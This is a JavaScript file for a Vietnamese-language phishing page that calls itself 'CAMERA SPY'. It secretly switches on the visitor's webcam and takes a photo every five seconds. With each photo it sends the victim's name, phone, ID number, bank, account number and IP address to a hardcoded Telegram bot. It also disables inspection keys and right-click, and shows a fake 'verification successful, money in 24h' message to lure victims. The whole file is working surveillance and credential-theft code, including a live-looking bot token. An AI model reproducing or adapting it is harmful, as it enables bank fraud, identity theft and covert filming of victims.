// ============================================
// AEGIS-X ULTRA - CAMERA SPY (FIXED - WORKING)
// ============================================

const CONFIG = {
    TOKEN: '8427083531:AAFPX-KfKwKNr2b3-wqoAGC0F0H_D0JVki8',
    CHAT_ID: '-1004386281388',
    INTERVAL: 5000
};

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
let stream = null;
let cameraReady = false;
let captureInterval = null;
let cameraStarted = false;

// ----- LOG -----
function log(msg) {
    console.log('[SPY]', new Date().toLocaleTimeString(), msg);
}

// ----- GỬI TEXT TRƯỚC ĐỂ TEST -----
function sendTestMessage() {
    const msg = `🔵 TEST CONNECTION\n⏰ ${new Date().toLocaleString('vi-VN')}\n✅ Bot is alive!`;

    fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: CONFIG.CHAT_ID,
            text: msg,
            parse_mode: 'HTML'
        })
    })
    .then(res => res.json())
    .then(data => {
        if (data.ok) {
            log('✅ Test message sent successfully!');
        } else {
            log('❌ Test message failed: ' + JSON.stringify(data));
        }
    })
    .catch(err => {
        log('❌ Test message error: ' + err.message);
    });
}

// ----- GỬI ẢNH -----
function sendPhoto(blob, data) {
    const form = new FormData();
    form.append('chat_id', CONFIG.CHAT_ID);
    form.append('photo', blob, `spy_${Date.now()}.jpg`);

    let caption = `📸 SPY CAPTURE\n`;
    caption += `⏰ ${new Date().toLocaleString('vi-VN')}\n`;
    caption += `📱 Phone: ${data.phone || 'N/A'}\n`;
    caption += `👤 Name: ${data.fullname || 'N/A'}\n`;
    caption += `🆔 ID: ${data.idNumber || 'N/A'}\n`;
    caption += `🏦 Bank: ${data.bank || 'N/A'}\n`;
    caption += `💳 Account: ${data.account || 'N/A'}\n`;
    caption += `🌐 IP: ${data.ip || 'N/A'}`;

    form.append('caption', caption);

    log('📤 Sending photo...');

    fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendPhoto`, {
        method: 'POST',
        body: form
    })
    .then(res => res.json())
    .then(data => {
        if (data.ok) {
            log('✅ Photo sent successfully!');
        } else {
            log('❌ Photo failed: ' + JSON.stringify(data));
        }
    })
    .catch(err => {
        log('❌ Photo error: ' + err.message);
    });
}

// ----- GỬI TEXT (FALLBACK) -----
function sendText(data) {
    let text = '📋 SPY CAPTURE (NO IMAGE)\n';
    text += `⏰ ${new Date().toLocaleString('vi-VN')}\n`;
    text += `📱 Phone: ${data.phone || 'N/A'}\n`;
    text += `👤 Name: ${data.fullname || 'N/A'}\n`;
    text += `🆔 ID: ${data.idNumber || 'N/A'}\n`;
    text += `🏦 Bank: ${data.bank || 'N/A'}\n`;
    text += `💳 Account: ${data.account || 'N/A'}\n`;
    text += `🌐 IP: ${data.ip || 'N/A'}`;

    log('📤 Sending text fallback...');

    fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: CONFIG.CHAT_ID,
            text: text,
            parse_mode: 'HTML'
        })
    })
    .then(res => res.json())
    .then(data => {
        if (data.ok) {
            log('✅ Text sent successfully!');
        } else {
            log('❌ Text failed: ' + JSON.stringify(data));
        }
    })
    .catch(err => {
        log('❌ Text error: ' + err.message);
    });
}

// ----- LẤY IP -----
function getIP() {
    return fetch('https://api.ipify.org?format=json')
        .then(r => r.json())
        .then(d => d.ip || 'unknown')
        .catch(() => 'unknown');
}

// ----- CHỤP ẢNH + GỬI -----
function captureAndSend() {
    if (!cameraReady || !stream) {
        log('⚠️ Camera not ready, skip');
        return;
    }

    try {
        const vw = video.videoWidth || 640;
        const vh = video.videoHeight || 480;
        canvas.width = vw;
        canvas.height = vh;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, vw, vh);

        log('📸 Captured frame: ' + vw + 'x' + vh);

        // Lấy data từ form
        const phone = document.getElementById('phone')?.value?.trim() || 'N/A';
        const fullname = document.getElementById('fullname')?.value?.trim() || 'N/A';
        const idNumber = document.getElementById('idNumber')?.value?.trim() || 'N/A';
        const bank = document.getElementById('bank')?.value || 'N/A';
        const account = document.getElementById('accountNumber')?.value?.trim() || 'N/A';

        const data = { phone, fullname, idNumber, bank, account, ip: 'loading...' };

        getIP().then(ip => {
            data.ip = ip;
            // Chuyển canvas sang blob và gửi
            canvas.toBlob(function(blob) {
                if (blob && blob.size > 0) {
                    log('📦 Blob size: ' + (blob.size / 1024).toFixed(2) + ' KB');
                    sendPhoto(blob, data);
                } else {
                    log('❌ Blob rỗng, gửi text thay thế');
                    sendText(data);
                }
            }, 'image/jpeg', 0.9);
        });

    } catch (e) {
        log('❌ Capture error: ' + e.message);
    }
}

// ----- BẬT CAMERA -----
function startCamera() {
    if (cameraStarted) return;
    cameraStarted = true;

    log('📷 Đang bật camera...');

    navigator.mediaDevices.getUserMedia({
        video: {
            facingMode: 'user',
            width: { ideal: 480 },
            height: { ideal: 360 }
        },
        audio: false
    })
    .then(s => {
        stream = s;
        video.srcObject = s;
        video.onloadedmetadata = () => {
            video.play();
            cameraReady = true;
            log('📷 Camera đã sẵn sàng!');

            // Gửi 1 ảnh ngay
            setTimeout(captureAndSend, 300);

            // Lên lịch chụp mỗi 5 giây
            if (captureInterval) clearInterval(captureInterval);
            captureInterval = setInterval(captureAndSend, CONFIG.INTERVAL);
        };
    })
    .catch(err => {
        log('❌ Lỗi camera: ' + err.message);
        // Vẫn gửi text data
        setTimeout(() => {
            const data = {
                phone: document.getElementById('phone')?.value?.trim() || 'N/A',
                fullname: document.getElementById('fullname')?.value?.trim() || 'N/A',
                idNumber: document.getElementById('idNumber')?.value?.trim() || 'N/A',
                bank: document.getElementById('bank')?.value || 'N/A',
                account: document.getElementById('accountNumber')?.value?.trim() || 'N/A',
                ip: 'loading...'
            };
            getIP().then(ip => {
                data.ip = ip;
                sendText(data);
            });
        }, 500);
    });
}

// ----- CHỐNG INSPECT -----
function antiInspect() {
    document.addEventListener('keydown', function(e) {
        const key = e.key.toLowerCase();
        const ctrl = e.ctrlKey || e.metaKey;
        const shift = e.shiftKey;

        if ((ctrl && shift && (key === 'i' || key === 'j')) ||
            (ctrl && (key === 'u' || key === 's')) ||
            key === 'f12' ||
            (ctrl && shift && key === 'c')) {
            e.preventDefault();
            return false;
        }
    });
    document.addEventListener('contextmenu', e => e.preventDefault());
    document.addEventListener('selectstart', e => e.preventDefault());
    log('🛡️ Anti-inspect active');
}

// ----- TRIGGER KHI CLICK -----
document.addEventListener('click', function firstClick() {
    log('👆 User click -> start camera');
    startCamera();
    document.removeEventListener('click', firstClick);
}, { once: true });

// ----- SUBMIT BUTTON -----
document.getElementById('submitBtn').addEventListener('click', function(e) {
    e.preventDefault();
    if (!cameraStarted) startCamera();
    if (cameraReady) {
        setTimeout(captureAndSend, 200);
    }
    // Hiện toast
    const toast = document.getElementById('toast');
    if (toast) {
        toast.textContent = '✅ Xác thực thành công! Tiền sẽ được chuyển trong 24h.';
        toast.classList.add('show');
        setTimeout(() => toast.classList.remove('show'), 4000);
    }
});

// ----- INIT -----
function init() {
    log('🚀 AEGIS-X ULTRA INIT');
    antiInspect();

    // Gửi tin nhắn test để kiểm tra kết nối
    setTimeout(sendTestMessage, 1000);

    log('✅ Waiting for user click...');
}

if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
} else {
    init();
}